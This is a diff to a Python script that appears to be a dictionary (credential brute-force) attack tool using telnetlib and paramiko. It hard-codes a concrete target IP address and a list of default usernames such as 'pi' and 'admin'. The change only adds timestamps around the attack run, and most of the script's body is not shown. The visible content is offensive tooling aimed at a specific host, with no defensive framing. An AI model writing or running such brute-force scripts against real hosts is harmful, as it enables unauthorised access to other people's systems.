@@ -1,6 +1,7 @@
 import telnetlib
 from xmlrpc.client import Fault
 import paramiko
+import datetime
 
 target_ip_address = ['157.82.207.245']
 id_list = ['pi', 'admin', 'user', 'usr', 'default']
@@ -58,4 +59,6 @@ def main():
 
 
 if __name__ == '__main__':
+    print(f"dictionary attack start time: {datetime.datetime.now()}")
     main()
+    print(f"dictionary attack finish time: {datetime.datetime.now()}")
